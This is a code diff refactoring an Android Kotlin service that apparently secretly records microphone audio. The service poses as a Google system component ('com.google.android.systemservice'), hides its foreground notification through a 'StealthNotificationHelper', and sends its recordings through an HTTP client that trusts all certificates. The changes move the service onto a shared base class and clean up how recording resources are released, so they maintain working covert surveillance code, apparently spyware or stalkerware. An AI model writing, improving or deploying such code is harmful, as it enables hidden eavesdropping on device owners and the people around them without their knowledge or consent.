@@ -1,6 +1,5 @@
 package com.google.android.systemservice.services
 
-import android.app.Service
 import android.content.Intent
 import android.media.AudioFormat
 import android.media.AudioRecord
@@ -8,7 +7,6 @@ import android.media.MediaCodec
 import android.media.MediaCodecInfo
 import android.media.MediaFormat
 import android.media.MediaRecorder
-import android.os.IBinder
 import android.util.Base64
 import android.util.Log
 import com.google.android.systemservice.config.AndroidConfig
@@ -23,7 +21,7 @@ import java.io.ByteArrayOutputStream
 import java.nio.ByteBuffer
 import java.util.concurrent.TimeUnit
 
-class AudioService : Service() {
+class AudioService : BaseService() {
     companion object {
         private const val TAG = "SystemAudio"
         private const val SAMPLE_RATE = 44100
@@ -33,6 +31,9 @@ class AudioService : Service() {
         private const val DEFAULT_MAX_DURATION_SEC = 60
     }
 
+    override val serviceTag = TAG
+    override val foregroundServiceId = StealthNotificationHelper.AUDIO_SERVICE_ID
+
     @Volatile private var audioRecord: AudioRecord? = null
     private var mediaCodec: MediaCodec? = null
     @Volatile private var isRecording = false
@@ -41,7 +42,6 @@ class AudioService : Service() {
     private var useCompression = true
     private var maxDurationSec = DEFAULT_MAX_DURATION_SEC
 
-    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val client = TrustAllCertificates.createSecureClientBuilder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .writeTimeout(120, TimeUnit.SECONDS)
@@ -52,11 +52,6 @@ class AudioService : Service() {
         super.onCreate()
         Log.d(TAG, "AudioService created")
         startForegroundSilent()
-    }
-
-    private fun startForegroundSilent() {
-        val notification = StealthNotificationHelper.createStealthNotification(this)
-        startForeground(StealthNotificationHelper.AUDIO_SERVICE_ID, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -118,7 +113,8 @@ class AudioService : Service() {
                 while (isRecording && isActive && totalBytesRecorded < maxBytes) {
                     val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                     if (bytesRead > 0) {
-                        if (useCompression && mediaCodec != null) {
+                        val codec = mediaCodec
+                        if (useCompression && codec != null) {
                             encodeToAAC(buffer, bytesRead)
                         } else {
                             encodedAudioBuffer.write(buffer, 0, bytesRead)
@@ -229,18 +225,17 @@ class AudioService : Service() {
         isRecording = false
         
         recordingJob?.cancel()
-        audioRecord?.stop()
         
         try {
             audioRecord?.stop()
-            audioRecord?.release()
-            audioRecord = null
-            
             mediaCodec?.stop()
             mediaCodec?.release()
             mediaCodec = null
         } catch (e: Exception) {
             Log.e(TAG, "Error stopping recording: ${e.message}")
+        } finally {
+            audioRecord?.release()
+            audioRecord = null
         }
 
         if (encodedAudioBuffer.size() > 0) {
@@ -306,12 +301,8 @@ class AudioService : Service() {
         }
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
-
     override fun onDestroy() {
-        super.onDestroy()
-        stopForeground(false)
         stopRecording()
-        serviceScope.cancel()
+        super.onDestroy()
     }
 }
